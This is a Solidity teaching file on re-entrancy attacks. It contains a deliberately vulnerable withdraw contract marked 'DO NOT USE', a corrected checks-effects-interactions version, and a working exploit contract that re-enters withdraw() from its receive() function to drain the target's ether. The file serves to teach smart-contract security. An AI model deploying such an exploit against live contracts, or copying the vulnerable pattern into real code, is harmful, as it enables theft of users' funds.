// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

/**
 * @title Re-entrancy
 * @author Dom-Mac <dom@dommac.dev>
 *
 * @notice A re-entrancy attack can happen when the
 *         Checks-Effects-Interactions pattern is not
 *         respected during contracts dev.
 *
 *         Check:        Validate parameters before
 *                       modifying the state
 *
 *         Effects:      Change the state
 *
 *         Interactions: Call other contracts after
 *                       storage has been updated
 *                       accordingly
 */

/**
 * @notice DO NOT USE - vulnerable contract
 */
contract ReEntrancyVulnerable {
    /**
     * @dev Mapping of token holders and amounts
     */
    mapping(address => uint256) public balances;

    /**
     * @dev Function to withdraw your holds
     */
    function withdraw() public {
        /**
         * @dev The interaction is made BEFORE the state's update
         *      **wrong**
         */
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");

        /**
         * @dev Update the state
         *      **wrong**
         */
        if (success) balances[msg.sender] = 0;
    }

    /**
     * @dev Function to deposit funds
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

contract ReEntrancyProof {
    /**
     * @dev Mapping of token holders and amounts
     */
    mapping(address => uint256) public balances;

    /**
     * @dev Function to withdraw your holds
     */
    function withdraw() public {
        uint256 amount = balances[msg.sender];

        /**
         * @dev Update the state before interaction
         */
        balances[msg.sender] = 0;

        /**
         * @dev The external interaction is made AFTER the state's update
         */
        (bool success, ) = msg.sender.call{value: amount}("");

        /**
         * @dev Check if the interaction was successful
         */
        require(success, "Withdrawal failed");
    }

    /**
     * @dev Function to deposit funds
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

contract ReEntrancyExploit {
    /**
     * @dev Expolit
     */
    ReEntrancyVulnerable public target;

    /**
     * @dev Initialise targeted contract
     */
    constructor(address target_) {
        target = ReEntrancyVulnerable(target_);
    }

    /**
     * @dev Function to attack target contract
     */
    function exploit() external payable {
        require(msg.value >= 1 ether);
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    /**
     * @dev Function executed on plain Ether transfers
     */
    receive() external payable {
        if (
            address(target).balance >= 1 ether &&
            target.balances(address(this)) > 0
        ) {
            target.withdraw();
        }
    }
}
